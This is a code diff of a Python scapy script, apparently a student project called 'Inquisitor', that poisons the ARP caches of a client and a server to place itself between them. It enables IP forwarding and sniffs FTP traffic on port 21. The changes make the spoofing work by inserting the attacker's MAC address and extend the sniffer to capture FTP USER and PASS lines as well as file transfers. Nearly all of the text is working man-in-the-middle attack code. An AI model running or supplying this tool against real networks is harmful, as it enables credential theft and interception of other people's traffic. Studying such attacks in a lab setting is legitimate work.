@@ -4,7 +4,7 @@ import sys
 import ipaddress
 import re
 import time
-from scapy.all import ARP, send, sniff, TCP, Raw, Ether
+from scapy.all import ARP, send, sniff, TCP, Raw, Ether, get_if_hwaddr
 
 class Inquisitor():
     def __init__(self, argument):
@@ -12,48 +12,58 @@ class Inquisitor():
         self.mac_addr_host = argument[2]
         self.ip_addr_serv = argument[3]
         self.mac_addr_serv = argument[4]
+        self.iface = "eth0"
+        self.my_mac = get_if_hwaddr(self.iface)
         print(f"Constructor, inquisition set : {self.mac_addr_host} + {self.ip_addr_host} + {self.mac_addr_serv} + {self.ip_addr_serv}")
 
     def restore(self):
         print("# -- Restoring ARP tables -- #")
-        # Restore client #
+        from scapy.all import sendp 
+        # -- Restoration package -- #
         restore_client = Ether(dst=self.mac_addr_host) / ARP(op=2, pdst=self.ip_addr_host, hwdst=self.mac_addr_host, psrc=self.ip_addr_serv, hwsrc=self.mac_addr_serv)                  
-        # Restore server #
         restore_serv = Ether(dst=self.mac_addr_serv) / ARP(op=2, pdst=self.ip_addr_serv, hwdst=self.mac_addr_serv, psrc=self.ip_addr_host, hwsrc=self.mac_addr_host)
-        # Sending through the Network #
-        send(restore_client, verbose=False, iface="eth0")
-        send(restore_serv, verbose=False, iface="eth0")
+        # -- Using count to make sure it work -- #
+        sendp(restore_client, verbose=False, iface=self.iface, count=5)
+        sendp(restore_serv, verbose=False, iface=self.iface, count=5)
+        print("# -- Restoration complete -- #")
 
     def send_poison(self):
-        # Lying to the client #
-        poison_client = Ether(dst=self.mac_addr_host) / ARP(op=2, pdst=self.ip_addr_host, hwdst=self.mac_addr_host, psrc=self.ip_addr_serv)
-        # Lying to the server #
-        poison_serv = Ether(dst=self.mac_addr_serv) / ARP(op=2, pdst=self.ip_addr_serv, hwdst=self.mac_addr_serv, psrc=self.ip_addr_host)
-        # Sending through the Network #
-        send(poison_client, verbose=False, iface="eth0")
-        send(poison_serv, verbose=False, iface="eth0")
+        # Poison package for client # 
+        poison_client = Ether(src=self.my_mac, dst=self.mac_addr_host) / \
+                        ARP(op=2, pdst=self.ip_addr_host, hwdst=self.mac_addr_host, \
+                            psrc=self.ip_addr_serv, hwsrc=self.my_mac)
+        
+        # Poison package for server # 
+        poison_serv = Ether(src=self.my_mac, dst=self.mac_addr_serv) / \
+                      ARP(op=2, pdst=self.ip_addr_serv, hwdst=self.mac_addr_serv, \
+                          psrc=self.ip_addr_host, hwsrc=self.my_mac)
+        # Sending the package #
+        from scapy.all import sendp
+        sendp(poison_client, verbose=False, iface=self.iface)
+        sendp(poison_serv, verbose=False, iface=self.iface)
 
     def packet_callback(self, packet):
         if(packet.haslayer(Raw)):
             try:
                 payload = packet[Raw].load.decode('utf-8', errors='ignore')
-                if "RETR" in payload or "STOR" in payload:
-                    print(f"# -- File founded : {payload.strip()} -- #")
+                if any(cmd in payload for cmd in ["RETR", "STOR", "USER", "PASS"]):
+                    print(f"\n[!] INTERCEPTED: {payload.strip()}")
             except:
                 pass
 
     def run(self):
-        print("[*] Starting port forwording")
+        print("# -- Starting port forwording -- #")
         os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
         try:
             print("# -- Initalise the poison loop -- #")
             while True:
                 self.send_poison()
-                sniff(filter="tcp port 21", prn=self.packet_callback, store=0, timeout=2, iface="eth0")
+                sniff(filter="tcp port 21", prn=self.packet_callback, store=0, timeout=1, iface=self.iface)
         except KeyboardInterrupt :
-            print("# -- Poison loop has been manually stopped -- #")
             self.restore()
             os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+            print("# -- Poison loop has been manually stopped -- #")
+            sys.exit(0)
 
     def verify_addr(self):
         pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
